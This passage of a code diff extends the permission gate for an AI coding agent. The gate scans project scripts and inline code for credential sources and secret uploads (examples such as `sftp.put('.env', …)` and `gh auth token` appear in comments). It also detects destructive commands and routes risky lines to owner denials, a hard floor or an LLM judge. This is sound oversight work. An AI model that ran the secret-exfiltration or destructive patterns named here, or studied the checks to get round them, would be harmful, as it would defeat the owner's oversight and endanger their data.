+      const file = words.slice(1).find((word) => !word.startsWith("-") && word !== UNKNOWN);
+      const text = file === undefined || file === "-" ? piped() : written.get(this.classify(file, at).path);
+      if (text) {
+        lines.push(...scheduledLines(text));
+        by = "the crontab's entries";
+      }
+    }
+    if (!lines.length) return undefined;
+    return this.scanFinding(lines.join("\n"), "shell", at, depth, by);
+  }
+
+  /** Whether a file is the project's committed code (git tracks it) that neither this line nor this task wrote. */
+  private committedCode(path: string, written: ReadonlyMap<string, string | undefined>): boolean {
+    const canonical = this.classify(path, this.cwd).path;
+    if (written.has(canonical) || this.taskWrote(canonical)) return false;
+    const tracked = spawnSync("git", ["-C", dirname(canonical), "ls-files", "--error-unmatch", "--", basename(canonical)], { stdio: "ignore", timeout: 3000 });
+    return tracked.status === 0;
+  }
+
+  /** A file's text for the project-script readers: what this line wrote there first, else the disk (scripts.ts). */
+  private scriptReader(written: ReadonlyMap<string, string | undefined>): (path: string) => string | undefined {
+    return (path) => {
+      const canonical = this.classify(path, this.cwd).path;
+      if (written.has(canonical)) return written.get(canonical);
+      return readText(path);
+    };
+  }
+
+  /**
+   * The project scripts a command runs (scripts.ts: a shell file, a make recipe, a package script, a justfile recipe),
+   * read as the shell lines they are (final pass): their floor findings, dangers and opaque code are the command's,
+   * as inline code's are. A script this line wrote first is read from what it wrote.
+   */
+  private scriptFinding(item: LineCommand, written: ReadonlyMap<string, string | undefined>, depth: number): CodeFinding | undefined {
+    if (depth > MAX_CODE_DEPTH) return undefined;
+    const reader = this.scriptReader(written);
+    const scripts = projectScripts(unwrapped(item.words), item.cwd === undefined ? undefined : this.paths.canonical(item.cwd, this.cwd), (path) => (path === "/dev/stdin" ? item.input : reader(path)), (path) => systemLocation(dirname(path)));
+    if (!scripts.length) return undefined;
+    let finding: CodeFinding | undefined;
+    for (const script of scripts) {
+      // The project's committed code is its owners' (iteration 2): what it does with its own secrets is the judge's. A
+      // script this task or this line wrote, or one no commit holds, is read for the floor.
+      if (script.file && this.committedCode(script.file, written)) continue;
+      const found = this.scanFinding(script.lines.join("\n"), "shell", script.cwd, depth, `the project script \`${script.by}\``);
+      if (!finding || (found.floor && !finding.floor) || (found.worst && !finding.worst && !finding.floor)) finding = { ...found, scripts: [...(finding?.scripts ?? []), script] };
+      else finding.scripts = [...(finding.scripts ?? []), script];
+    }
+    return finding;
   }
 
   private codeFinding(item: LineCommand, before: LineCommand | undefined, written: ReadonlyMap<string, string | undefined>, depth: number): CodeFinding | undefined {
@@ -1990,7 +2788,9 @@ export class Permissions {
     if (scan.opaque.length) finding.opaque = scan.opaque.join("; ");
     if (scan.network.length) finding.sink = `${language} code (${scan.network.slice(0, 3).map((name) => name.replace(/\($/, "")).join(", ")})`;
     else if (scan.urls.length && scan.reads) finding.sink = `${language} code (it opens ${scan.urls[0].slice(0, 80)})`;
-    if (scan.reads || scan.spawn.length) {
+    // Code that reaches the network may send a file it names without a read call of its own (iteration 3: an upload
+    // API that takes a path, `sftp.put('.env', …)`, `upload_file('.env', …)`): a secret it names is a source then too.
+    if (scan.reads || scan.spawn.length || scan.network.length) {
       for (const path of scan.paths) {
         if (!/[/.~]/.test(path) || /^[a-z][\w+.-]*:\/\//i.test(path)) continue;
         const classification = this.classify(resolveText(path, this.home), at);
@@ -2013,7 +2813,14 @@ export class Permissions {
         }
       }
     }
-    for (const line of scan.commands.slice(0, MAX_CODE_COMMANDS)) nested(line);
+    for (const line of scan.commands.slice(0, MAX_CODE_COMMANDS)) {
+      nested(line);
+      // A command the code runs that prints a stored credential (iteration 4: `subprocess.check_output(['gh','auth','token'])`)
+      // is a secret source for the code's own sink, as on a shell line (one SECRET_SOURCES table).
+      const words = line.split(/\s+/).filter(Boolean).map((word) => word.replace(/^['"]|['"]$/g, ""));
+      const source = words.length ? credentialSource(viewOf(words)) : undefined;
+      if (source && source !== "the environment") finding.secret ??= source;
+    }
     return finding;
   }
 
@@ -2152,7 +2959,9 @@ export class Permissions {
       finish({ decidedBy: "rule", reason: check.reason, prompted: false });
       return { ok: false, reason: check.reason };
     }
-    if (check.kind === "outside") {
+    // A rule or an inspection allows it without review, unless a denial or the floor holds it (round 6, W1).
+    const heldOutside = check.kind === "outside" ? await this.gateLine("bash:outside", command, ctx.cwd) : undefined;
+    if (check.kind === "outside" && !heldOutside) {
       finish({ decision: "allow", decidedBy: check.rules.length ? "rule" : "inspect", prompted: false });
       return { ok: true, scope: "rule", by: "rule" };
     }
@@ -2233,7 +3042,7 @@ export class Permissions {
     return this.serialized(async () => {
       // An earlier dialog in the queue may have allowed it meanwhile.
       this.refresh();
-      if (this.checkCommand(command, ctx.cwd, { escalated: true }).kind === "outside") {
+      if (!heldOutside && this.checkCommand(command, ctx.cwd, { escalated: true }).kind === "outside" && !(await this.gateLine("bash:outside", command, ctx.cwd))) {
         finish({ decision: "allow", decidedBy: "rule", prompted: false });
         return { ok: true, scope: "rule", by: "rule" } as const;
       }
@@ -2251,7 +3060,13 @@ export class Permissions {
       let classOfLine: ActionClass | undefined;
       const actionClass = () => (classOfLine ??= this.lineClass(line, command, ctx.cwd, read));
       const denied = this.denials.any() ? await this.deniedLike(actionClass()) : { similar: [] };
-      const foreign = read ? await this.foreignTargets("targets" in read ? read.targets : (read.known ?? [])) : undefined;
+      // Another task's work: a danger's read targets, and what any line destroys of another chat's, globs too (round 6, W3).
+      // Another chat's file or folder inside this chat's working tree, lineage unknown: the judge's, with it as evidence (round 6 narrowing).
+      const named = read ? await this.foreignTargets("targets" in read ? read.targets : (read.known ?? [])) : undefined;
+      const destroyed = named === undefined && this.othersMade().length ? await this.otherTaskOf(actionClass()) : undefined;
+      const foreign = named ?? destroyed?.floor;
+      const otherReview = foreign === undefined ? destroyed?.review : undefined;
+      this.gated?.push({ entry: "bash:escalate", ...(denied.active ? { held: "owner-denied" } : foreign ? { held: "other-task" } : otherReview ? { held: "other-task-review" } : {}) });
       const floor = this.alwaysAsk(line, {
         ...(denied.active ? { ownerDenied: `you denied \`${denied.active.denial.what}\` (${denied.active.denial.at.slice(0, 16).replace("T", " ")} UTC) and haven't asked for it since` } : {}),
         ...(foreign ? { otherTask: foreign } : {}),
@@ -2275,8 +3090,10 @@ export class Permissions {
         if (dangerous || installedRead) await this.refreshOwnerWords();
         const purpose = [proposal.label && `Purpose: ${proposal.label}`, proposal.reason && `Reason: ${proposal.reason}`].filter(Boolean).join("\n");
         // An approval is remembered for the commands' own categories, never for patterns the agent proposed; a danger's, never.
-        const memo = dangerous ? [] : patterns.filter((pattern) => !pattern.proposed);
-        const evidence = this.evidenceFor(targets, data, ctx, denied.similar, [line.kind, ...(line.assessments ?? []).map((assessment) => assessment.kind)], line);
+        // Nor one of another chat's work held for review: the next such line is reviewed again.
+        const memo = dangerous || otherReview ? [] : patterns.filter((pattern) => !pattern.proposed);
+        const found = this.evidenceFor(targets, data, ctx, denied.similar, [line.kind, ...(line.assessments ?? []).map((assessment) => assessment.kind)], line);
+        const evidence: JudgeEvidence | undefined = otherReview ? { ...found, otherChats: [otherReview] } : found;
         const reviewed = await this.review(
           {
             capability: "escalate",
@@ -2310,7 +3127,12 @@ export class Permissions {
         if (verdict.decision === "approve") {
           // `approve-once`: this call runs, and nothing is remembered; so does an approval of a danger, of a
           // line that reads a secret (risk.ts `once`) or the installed app's data, or of an ask the owner's words answered.
-          const kept = verdict.once || dangerous || installedRead || line.once === true || line.assessments?.some((assessment) => assessment.once === true) ? [] : memo;
+          // A line that runs a project script (final pass): its approval was of the script's lines as they are now; a
+          // remembered pattern would cover them after any edit. Once.
+          // Iteration 3: nor a line Cypher couldn't read in full (a word, a program or a redirection known only when it
+          // runs, opaque code, a path whose start is unknown): what was approved isn't what a pattern would match later.
+          const unreadable = Boolean(line.opaqueCode?.length || line.unresolved?.length || line.commands.some((item) => item.words.includes(UNKNOWN) || item.reads.includes(UNKNOWN) || item.writes.includes(UNKNOWN)));
+          const kept = verdict.once || dangerous || installedRead || unreadable || line.once === true || line.scripts?.length || line.unread?.length || line.assessments?.some((assessment) => assessment.once === true) ? [] : memo;
           for (const pattern of kept) this.addCommandGrant(pattern, "chat", "judge", label);
           const quoted = audit.explicit?.ok && audit.explicit.quote ? ` (your words: "${audit.explicit.quote}")` : "";
           finish({ decision: "allow", decidedBy: "judge", reason: `${verdict.reason}${quoted}`, scope: kept.length ? "chat" : "once", prompted: false });
@@ -2444,6 +3266,9 @@ export class Permissions {
     const evidence: { -readonly [K in keyof JudgeEvidence]: JudgeEvidence[K] } = {};
     // Code it runs that can't be read, and paths known only when it runs that could be the permission system (round 5).
     if (line?.opaqueCode?.length) evidence.opaqueCode = line.opaqueCode;
+    // The project scripts it runs, their lines as read (final pass), and what the code couldn't read.
+    if (line?.scripts?.length) evidence.projectScripts = line.scripts.map((script) => `\`${script.by}\` runs: ${script.lines.slice(0, 12).map((text) => text.slice(0, 160)).join(" ; ")}${script.lines.length > 12 ? " ; …" : ""}`);
+    if (line?.unread?.length) evidence.unread = line.unread;
     if (line?.unresolved?.length) evidence.unresolved = line.unresolved;
     if (targets) {
       const known = "targets" in targets ? targets.targets : (targets.known ?? []);
@@ -2460,6 +3285,10 @@ export class Permissions {
     if (targets) {
       const notOurs = this.notThisTask("targets" in targets ? targets.targets : (targets.known ?? []));
       if (notOurs.length) evidence.notThisTask = notOurs.map((item) => `${item.what}: ${item.why}${item.named ? ` (the owner's words name it: "${item.named.length > 100 ? `${item.named.slice(0, 100)}…` : item.named}")` : ""}`);
+      // Final pass: what it deletes or stops that no ledger on this machine accounts for — not this chat's, not another
+      // chat's known one. Who made it is then known to no code here: the judge reads it as unknown, not as this task's.
+      const unknown = this.originUnknown("targets" in targets ? targets.targets : (targets.known ?? []), notOurs.map((item) => item.what), line);
+      if (unknown.length) evidence.originUnknown = unknown;
     }
     return Object.keys(evidence).length ? evidence : undefined;
   }
@@ -2472,13 +3301,78 @@ export class Permissions {
    * resolver: a glob by its fixed directory), the targets read from the line. The line itself when it
    * names nothing.
    */
-  private lineClass(line: LineAssessment, command: string, cwd: string, read: LineTargets | undefined): ActionClass {
+  private lineClass(given: LineAssessment, command: string, cwd: string, read: LineTargets | undefined): ActionClass {
+    // Denials and other tasks' work are read with a program hidden behind an assignment shown (iteration 2).
+    const line = given.shown ? { ...given, commands: given.shown } : given;
+    const cls = this.lineClassOwn(line, command, cwd, read);
+    // What the project scripts it runs do (final pass, scripts.ts): their lines' units, read as lines of their own.
+    if (this.scriptDepth >= 2) return cls;
+    const extra: ActionClass["units"][number][] = [];
+    const written = new Map<string, string | undefined>();
+    for (const item of line.commands) {
+      const here = item.cwd === undefined ? cwd : this.paths.canonical(item.cwd, this.cwd);
+      // A git command that discards a work tree's uncommitted work (iteration 2, `GIT_DISCARDS`) destroys that tree's work:
+      // the tree itself is the target, when it isn't this chat's own (its own tree's work is its own to discard).
+      const discarded = gitDiscards(unwrapped(item.words));
+      if (discarded) {
+        const tree = discarded.dir === undefined ? here : discarded.dir === UNKNOWN ? undefined : this.paths.canonical(discarded.dir, here);
+        const top = tree === undefined ? undefined : (gitRoots(tree).top ?? tree);
+        if (top !== undefined && !this.inOwnTrees(top)) extra.push({ effects: ["change"], scopes: [{ kind: "path", name: top, says: [displayPath(top, this.home)] }, { kind: "worktree", name: top, says: [displayPath(top, this.home)] }], destroys: true });
+      }
+      // Inline code's own effects (final pass): the commands it spawns, read as lines of their own, and the processes
+      // it signals by pid (code.ts `SIGNAL_CALLS`).
+      const inline = codeOf(runWords(item.words), UNKNOWN, undefined);
+      const spawned: ProjectScript[] = [];
+      // Command lines it may run that the reader didn't read (iteration 3, `operandLines`): their units are its own.
+      const lines = this.operandLines([item]);
+      if (lines.length) spawned.push({ by: `${basename(unwrapped(item.words)[0] ?? "")} runs`, lines: lines.map((entry) => entry.text), cwd: here });
+      if (inline && inline.source.from === "inline" && inline.interpreter.language !== "shell") {
+        const language = inline.interpreter.language as Parameters<typeof scanCode>[1];
+        const scan = scanCode(inline.source.text, language, secretName);
+        if (scan.commands.length) spawned.push({ by: `${basename(item.words[0] ?? "")} code`, lines: scan.commands.slice(0, 16), cwd: here });
+        const pids = signaledPids(inline.source.text, language);
+        if (pids.length) {
+          const scopes = pids.map((pid): DenialScope => ({ kind: "process", name: pid, says: [pid] }));
+          extra.push({ effects: ["stop"], scopes, destroys: true });
+        }
+      }
+      // A script this line wrote before running it is read from what it wrote (final pass).
+      const scripts = projectScripts(unwrapped(item.words), item.cwd === undefined ? undefined : this.paths.canonical(item.cwd, this.cwd), this.scriptReader(written), (path) => systemLocation(dirname(path)));
+      this.noteLineWrite(item, written);
+      for (const script of [...spawned, ...scripts]) {
+        this.scriptDepth++;
+        try {
+          for (const text of script.lines) {
+            const inner = this.lineClass(this.assess(text, script.cwd), text, script.cwd, undefined);
+            for (const unit of inner.units) if (unit.destroys || unit.effects.some((effect) => effect !== "read" && effect !== "run")) extra.push({ ...unit, ...(unit.runtime ? { runtime: unit.runtime.map((operand) => ({ ...operand, by: `${script.by}: ${operand.by}` })) } : {}) });
+          }
+        } finally {
+          this.scriptDepth--;
+        }
+      }
+    }
+    return extra.length ? { ...cls, units: [...cls.units, ...extra], scopes: [...cls.scopes, ...extra.flatMap((unit) => unit.scopes.filter((scope) => scope.kind !== "line"))] } : cls;
+  }
+  private scriptDepth = 0;
+
+  /** Whether a command runs a project script whose lines can destroy something (scripts.ts), for the cheap check of `gateLine`. */
+  private runsScript(item: LineCommand): boolean {
+    // Inline code that spawns commands or signals a pid (final pass) runs other lines too.
+    const inline = codeOf(runWords(item.words), UNKNOWN, undefined);
+    if (inline && inline.source.from === "inline" && inline.interpreter.language !== "shell") {
+      const language = inline.interpreter.language as Parameters<typeof scanCode>[1];
+      if (signaledPids(inline.source.text, language).length || scanCode(inline.source.text, language, secretName).commands.length) return true;
+    }
+    return projectScripts(unwrapped(item.words), item.cwd === undefined ? undefined : this.paths.canonical(item.cwd, this.cwd), readText, (path) => systemLocation(dirname(path))).length > 0;
+  }
+
+  private lineClassOwn(line: LineAssessment, command: string, cwd: string, read: LineTargets | undefined): ActionClass {
     const actions = new Set<string>();
     const all: DenialScope[] = [];
-    const units: { effects: EffectClass[]; scopes: DenialScope[] }[] = [];
+    const units: { effects: EffectClass[]; scopes: DenialScope[]; destroys?: boolean; globs?: string[]; runtime?: RuntimeOperand[] }[] = [];
     const seen = new Set<string>();
     const scopeOf = (scope: DenialScope): DenialScope => {
-      const key = `${scope.kind}\u0000${scope.name}\u0000${scope.remote ?? ""}`;
+      const key = `${scope.kind}\u0000${scope.name}\u0000${scope.remote ?? ""}\u0000${scope.scope ?? ""}\u0000${scope.type ?? ""}`;
       if (!seen.has(key)) {
         seen.add(key);
         all.push(scope);
@@ -2492,14 +3386,14 @@ export class Permissions {
         const found = this.couldBe(pattern, at);
         if (found.anywhere || !found.fixed.length) return undefined;
         const path = found.fixed[0];
-        return scopeOf({ kind: "path", name: path, says: [displayPath(path, this.home)] });
+        return scopeOf({ kind: "path", name: path, says: [displayPath(path, this.home)], glob: true });
       }
       if (/^[a-z][\w+.-]*:\/\//i.test(word) || word.startsWith("-")) return undefined;
       if (at === undefined && !isAbsolute(word) && !word.startsWith("~")) return undefined;
       const path = this.classify(word, at ?? cwd).path;
       return scopeOf({ kind: "path", name: path, says: [displayPath(path, this.home), word] });
     };
-    let unit: { effects: EffectClass[]; scopes: DenialScope[] } | undefined;
+    let unit: { effects: EffectClass[]; scopes: DenialScope[]; destroys?: boolean; globs?: string[]; runtime?: RuntimeOperand[] } | undefined;
     const effect = (value: EffectClass) => {
       if (unit && !unit.effects.includes(value)) unit.effects.push(value);
     };
@@ -2513,6 +3407,23 @@ export class Permissions {
       const add = (scope: DenialScope | undefined) => {
         if (scope && unit && !unit.scopes.includes(scope)) unit.scopes.push(scope);
       };
+      // What destroys (round 6, W3: the other-task floor): a delete, erase or stop by the program tables, a move away.
+      if (this.destroys(item)) unit.destroys = true;
+      // Operands known only when it runs (round 6 step 2, flow.ts): the possible set its producers could hand it.
+      const runtime = this.runtimeOf(line.commands, index, cwd);
+      if (runtime) {
+        unit.destroys = true;
+        for (const effect of runtime.operand.effects ?? []) if (!unit.effects.includes(effect)) unit.effects.push(effect);
+        if (runtime.operand.root !== undefined) add(pathScope(runtime.operand.root, item.cwd));
+        if (runtime.operand.kinds.some((kind) => kind !== "path")) (unit.runtime ??= []).push(runtime.operand);
+        if (runtime.globs.length) (unit.globs ??= []).push(...runtime.globs);
+      }
+      // The globs it is given, canonical (resolve.ts): what they could match is what it acts on.
+      for (const pattern of item.patterns ?? []) {
+        if (pattern === undefined || !/[*?[]/.test(pattern)) continue;
+        const resolved = resolvePattern(pattern, { home: this.home, cwd: this.paths.canonical(item.cwd ?? cwd, this.cwd) });
+        if (!resolved.anywhere) (unit.globs ??= []).push(...resolved.globs);
+      }
       for (const [at, path] of item.writes.entries()) {
         effect("change");
         add(pathScope(path, item.cwd, item.writePatterns?.[at]));
@@ -2527,22 +3438,96 @@ export class Permissions {
       const program = basename(item.words[0] ?? "");
       const tool = readTool(item.words);
       actions.add(tool && "row" in tool ? [program, ...tool.row.sub].join(" ") : program);
-      const found = commandEffects(item.words, {
+      // `GH_REPO=o/r gh …` is `gh … --repo o/r` (schema.ts `ENV_OPTIONS`): the same request in either spelling.
+      // Destinations some programs write that their tables read as a transfer or a query (iteration 4): rsync's local
+      // destination (`--delete` destroys what it lacks there), a database file a SQL client changes (`sqlite3 F 'DROP …'`).
+      {
+        const inner = unwrapped(item.words);
+        const name = basename(inner[0] ?? "");
+        const positionals = inner.slice(1).filter((word) => !word.startsWith("-") && word !== UNKNOWN);
+        let destination: string | undefined;
+        let destroying = false;
+        if (name === "rsync" && positionals.length >= 2 && !/^[^/]*:/.test(positionals.at(-1)!)) {
+          destination = positionals.at(-1);
+          destroying = inner.some((word) => /^--(delete|delete-\w+|del|remove-source-files)$/.test(word));
+        }
+        if (/^(sqlite3|sqlite|duckdb)$/.test(name) && positionals.length >= 1) {
+          const sql = positionals.slice(1).join(" ") + (item.input ?? "");
+          if (/\b(drop|delete|update|insert|alter|create|replace|vacuum)\b/i.test(sql)) {
+            destination = positionals[0];
+            destroying = /\b(drop|delete)\b/i.test(sql);
+          }
+        }
+        // A unit of its own: what it does to its sources is no part of it.
+        const scope = destination !== undefined && (item.cwd !== undefined || isAbsolute(destination) || destination.startsWith("~")) ? pathScope(destination, item.cwd) : undefined;
+        if (scope) units.push({ effects: ["change"], scopes: [scope], ...(destroying ? { destroys: true } : {}) });
+      }
+      // An image published by a build (iteration 4: `docker buildx build --push -t X`, `build --push`, `buildx bake --push`,
+      // `compose push`): a push of that image, as `docker push X` is.
+      {
+        const inner = unwrapped(item.words);
+        if (/^(docker|podman)$/.test(basename(inner[0] ?? "")) && ((inner.includes("build") || inner.includes("bake")) && inner.some((word) => word === "--push" || /^--output=.*type=registry/.test(word)) || (inner[1] === "compose" && inner.includes("push")))) {
+          effect("push");
+          for (const [at, word] of inner.entries()) {
+            const tag = word === "-t" || word === "--tag" ? inner[at + 1] : /^--tag=(.+)$/.exec(word)?.[1];
+            if (tag && tag !== UNKNOWN) add(scopeOf({ kind: "image", name: tag, says: [tag] }));
+          }
+        }
+      }
+      // Scaling a workload to nothing stops it (iteration 2: `kubectl scale … --replicas=0`), whatever the tool calls it.
+      if (/^(kubectl|oc)$/.test(basename(unwrapped(item.words)[0] ?? "")) && unwrapped(item.words).includes("scale") && unwrapped(item.words).some((word, at, all) => word === "--replicas=0" || (word === "--replicas" && all[at + 1] === "0"))) {
+        effect("stop");
+        unit.destroys = true;
+      }
+      // A publish of the folder's own package (schema.ts `FOLDER_PUBLISHERS`): that package, by whichever tool.
+      const published = folderPackage(unwrapped(item.words), item.cwd === undefined ? undefined : this.paths.canonical(item.cwd, this.cwd), readText);
+      if (published !== undefined) {
+        effect("publish");
+        add(scopeOf({ kind: "package", name: published, says: [published.replace(/^folder:.*\//, "")] }));
+      }
+      const found = commandEffects(withEnvOptions(item.words, envPrefixOf(item)), {
         sink: (words) => sinkOf(viewOf(words)),
         current: program === "git" ? this.gitAt(item.cwd ?? cwd)?.current : undefined,
       });
       for (const value of found.effects) effect(value);
       for (const target of found.targets) {
         if (target.kind === "path" || target.kind === "worktree") add(pathScope(target.name, item.cwd));
-        else add(scopeOf({ kind: target.kind, name: target.name, ...(target.remote ? { remote: target.remote } : {}), ...(target.repo ? { repo: target.repo } : {}), says: [target.name] }));
+        else add(scopeOf({ kind: target.kind, name: target.name, ...(target.remote ? { remote: target.remote } : {}), ...(target.repo ? { repo: target.repo } : {}), ...(target.scope ? { scope: target.scope } : {}), ...(target.type ? { type: target.type } : {}), says: [target.name] }));
       }
       const offset = item.words.length - (item.patterns?.length ?? item.words.length);
+      // A search that picks what it acts on (`find . -name '*.pyc' -delete`): its roots are where it looks, not what it
+      // destroys (round 6 step 2); what its tests pick is its possible set (`runtimeOf`).
+      const picks = /^(find|gfind|fd)$/.test(program) && item.words.some((word) => FIND_TESTS.test(word));
       for (const word of found.paths) {
         const at = item.words.indexOf(word);
-        add(pathScope(word, item.cwd, word === UNKNOWN ? undefined : item.patterns?.[at - offset]));
+        const scope = pathScope(word, item.cwd, word === UNKNOWN ? undefined : item.patterns?.[at - offset]);
+        add(scope && picks ? { ...scope, glob: true } : scope);
       }
       // Globs and words known only when it runs, by their fixed directory.
       for (const [at, pattern] of (item.patterns ?? []).entries()) if (pattern !== undefined && item.words[at + offset] === UNKNOWN && at + offset > 0) add(pathScope(UNKNOWN, item.cwd, pattern));
+      // Inline code (round 6 step 2, code.ts `scanCode`): the files its literals name and the hosts its URLs reach are
+      // what it acts on, with what the code does to them (`CODE_DELETES`: a delete destroys), for denials and the floor.
+      const inline = codeOf(runWords(item.words), UNKNOWN, undefined);
+      if (inline && inline.source.from === "inline" && inline.interpreter.language !== "shell") {
+        const scan = scanCode(inline.source.text, inline.interpreter.language as Parameters<typeof scanCode>[1], secretName);
+        const deletes = CODE_DELETES.test(inline.source.text);
+        // A delete call's literal argument is a path even when bare (`shutil.rmtree('data')`; iteration 3).
+        const bare = deletes ? [...inline.source.text.matchAll(/\b(?:rmtree|rmSync|rmdirSync|unlinkSync|unlink|rmdir|remove|removedirs|rm_rf|rm_r|rm|delete)\s*\(\s*['"]([\w.@+-]+)['"]/g)].map((match) => match[1]) : [];
+        for (const path of [...scan.paths, ...bare.map((name) => `./${name}`)]) {
+          if (!/[/~.]/.test(path) || /^[a-z][\w+.-]*:\/\//i.test(path)) continue;
+          const scope = pathScope(resolveText(path, this.home), item.cwd);
+          if (!scope) continue;
+          add(scope);
+          effect(scan.writes || deletes ? "change" : "read");
+          if (deletes) unit.destroys = true;
+        }
+        for (const url of scan.urls) {
+          const host = /^[a-z][\w+.-]*:\/\/(?:[^@/]*@)?([^/:?#]+)/i.exec(url)?.[1];
+          if (!host) continue;
+          add(scopeOf({ kind: "host", name: host, says: [host] }));
+          effect("send");
+        }
+      }
       // What the catalogue says it destroys or stops (a simulator, a container, a worktree).
       const destroyed = targetsOf(item, this.catalogueFacts());
       for (const group of destroyed?.targets ?? []) {
@@ -2561,31 +3546,370 @@ export class Permissions {
       if (scope && units.length && !units.some((item) => item.scopes.includes(scope))) units.at(-1)!.scopes.push(scope);
     }
     const concern = assessments.find((assessment) => assessment.concern)?.concern ?? (line.tier === "danger" ? line.key : undefined);
-    const named = units.filter((item) => item.scopes.length);
+    const named = units.filter((item) => item.scopes.length || item.globs?.length || item.runtime?.length);
     const effects = [...new Set(units.flatMap((item) => item.effects))];
     const lineScope = (): DenialScope => scopeOf({ kind: "line", name: command });
     return {
       tool: "bash",
       actions: [...actions],
       ...(concern ? { concern } : {}),
+      // With the options an environment prefix stands for (`GH_REPO=o/r` is `--repo o/r`; schema.ts `ENV_OPTIONS`).
+      tokens: line.commands.flatMap((item) => withEnvOptions(item.words, envPrefixOf(item)).slice(1).flatMap((word) => (word === UNKNOWN ? [] : /^--[^=]+=./.test(word) ? [word.slice(word.indexOf("=") + 1)] : word.startsWith("-") ? [] : [word]))),
+      argv: line.commands.flatMap((item) => withEnvOptions(item.words, envPrefixOf(item)).slice(1).flatMap((word) => (word === UNKNOWN ? [] : /^--[^=]+=./.test(word) ? [word.slice(0, word.indexOf("=")), word.slice(word.indexOf("=") + 1)] : [word]))),
       scopes: all.length ? all : [lineScope()],
-      units: named.length ? named.map((item) => ({ effects: item.effects.length ? item.effects : ["run"], scopes: item.scopes })) : [{ effects: effects.length ? effects : ["run"], scopes: [lineScope()] }],
+      units: named.length
+        ? // A unit known only by its possible set (no named scope) is also its line, so the same line asked again meets it (final pass).
+          named.map((item) => ({ effects: item.effects.length ? item.effects : ["run"], scopes: item.scopes.length ? item.scopes : [lineScope()], ...(item.destroys ? { destroys: true } : {}), ...(item.globs?.length ? { globs: item.globs } : {}), ...(item.runtime?.length ? { runtime: item.runtime } : {}) }))
+        : [{ effects: effects.length ? effects : ["run"], scopes: [lineScope()], ...(units.some((item) => item.destroys) ? { destroys: true } : {}), ...(units.some((item) => item.globs?.length) ? { globs: units.flatMap((item) => item.globs ?? []) } : {}), ...(units.some((item) => item.runtime?.length) ? { runtime: units.flatMap((item) => item.runtime ?? []) } : {}) }],
     };
   }
 
+  /**
+   * The one check every entry point makes before it allows (round 6, W1; `ENTRY_POINTS`): the owner's denials
+   * (denials.ts) and the floor's `before` rows (floor.ts) — the permission system, another task's work this
+   * destroys (`otherTaskOf`), and whatever the caller adds (`subject`). Undefined: nothing holds it, and it
+   * passes as before. Cheap when nothing can match: no denial in this chat, nothing destroyed, no other chat.
+   */
+  async gate(entry: EntryPoint, cls: ActionClass, subject: FloorSubject = {}): Promise<FloorHit | undefined> {
+    const denied = this.denials.any() ? await this.deniedLike(cls) : undefined;
+    const other = subject.otherTask !== undefined ? { floor: subject.otherTask } : await this.otherTaskOf(cls);
+    const hit = floorOf(
+      {
+        ...subject,
+        ...(denied?.active ? { ownerDenied: `you denied \`${denied.active.denial.what}\` (${denied.active.denial.at.slice(0, 16).replace("T", " ")} UTC) and haven't asked for it since` } : {}),
+        ...(other?.floor ? { otherTask: other.floor } : {}),
+      },
+      "before",
+    );
+    // Asked for since in words that also defer (denials.ts `deferredLift`): reviewed by the judge, not the floor.
+    // Another chat's file or folder inside this chat's working tree, lineage unknown (`otherTaskOf`): the same.
+    const reviewed: FloorHit | undefined = hit
+      ? undefined
+      : denied?.review
+        ? { id: "owner-denied", reason: "you denied a request like it in this chat", detail: `you denied \`${denied.review.denial.what}\`; since then you wrote "${denied.review.word.slice(0, 120)}"`, review: true }
+        : other?.review
+          ? { id: "other-task", reason: "it destroys what another chat made in this working tree", detail: other.review, review: true }
+          : undefined;
+    this.gated?.push({ entry, ...(hit ? { held: hit.id } : reviewed ? { held: `${reviewed.id}-review` } : {}) });
+    return hit ?? reviewed;
+  }
+
+  /** A file tool's (or a tool's) request as an action class: its effect and its paths (denials.ts), as `elevate` reads one. */
+  fileClass(tool: string, capability: Capability, paths: readonly string[], op?: AccessRequest["op"]): ActionClass {
+    const scopes: DenialScope[] = paths.map((path) => ({ kind: "path" as const, name: path, says: [displayPath(path, this.home)] }));
+    // A delete or a move away destroys the file (a patch's operation; `AccessRequest.op`), as `rm`/`mv` of it do.
+    const destroys = capability === "write" && op !== undefined;
+    return { tool, actions: destroys ? [capability, op] : [capability], scopes, units: [{ effects: [capability === "write" ? "change" : "read"], scopes, ...(destroys ? { destroys: true } : {}) }], tokens: paths };
+  }
+
+  /** A tool's (MCP, extension) request as an action class: its own effect, its input as the line, and the input's words for the safety net. */
+  private toolClass(name: string, input: unknown): ActionClass {
+    let rendered = "";
+    try {
+      rendered = JSON.stringify(input) ?? "";
+    } catch {
+      rendered = String(input);
+    }
+    const scopes: DenialScope[] = [{ kind: "line", name: `${name} ${rendered.slice(0, 2000)}` }];
+    const words = [...rendered.matchAll(/"((?:[^"\\]|\\.)*)"/g)].map((match) => match[1]).filter((word) => word.length >= 2 && word.length <= 400);
+    // The files it names, as a unit of their own (round 6 step 2): denials, the permission system and other tasks' work meet them.
+    const files = this.toolPaths(name, input);
+    const fileScopes: DenialScope[] = files.paths.map((path) => ({ kind: "path" as const, name: path, says: [displayPath(path, this.home)] }));
+    const fileUnit = fileScopes.length ? [{ effects: files.effects, scopes: fileScopes, ...(files.destroys ? { destroys: true } : {}) }] : [];
+    return { tool: name, actions: [`tool:${name}`], scopes: [...scopes, ...fileScopes], units: [{ effects: [`tool:${name}` as EffectClass], scopes }, ...fileUnit], tokens: [...words, ...files.paths] };
+  }
+
+  /**
+   * A command's operands known only when it runs (round 6 step 2, flow.ts `runtimeOperand`): the kinds and
+   * name tests of what its producers could hand it, and for files, the globs a listing producer could print
+   * (risk.ts `listingSet`: `find ROOT -name P -exec rm {} +`, `ls GLOB | xargs rm`) or the root a cleaner
+   * empties (`ROOT_CLEANERS`). A file set no listing states stays unknown: it meets no other chat's files.
+   */
+  private runtimeOf(commands: readonly LineCommand[], index: number, cwd: string): { operand: RuntimeOperand; globs: string[] } | undefined {
+    const item = commands[index];
+    const raw = item.words;
+    const first = basename(raw[0] ?? "");
+    const inner = /^(xargs|parallel|find|gfind)$/.test(first) ? raw : unwrapped(raw);
+    const at = this.paths.canonical(item.cwd ?? cwd, this.cwd);
+    const cleaner = ROOT_CLEANERS.find((row) => row.program === basename(inner[0] ?? "") && row.sub.every((word, i) => inner[i + 1] === word));
+    if (cleaner && !inner.some((word) => /^(-[a-zA-Z]*n[a-zA-Z]*|--dry-run)$/.test(word))) {
+      // Its pathspecs, when it names any (`git clean -fdx src/`); else the folder it runs in.
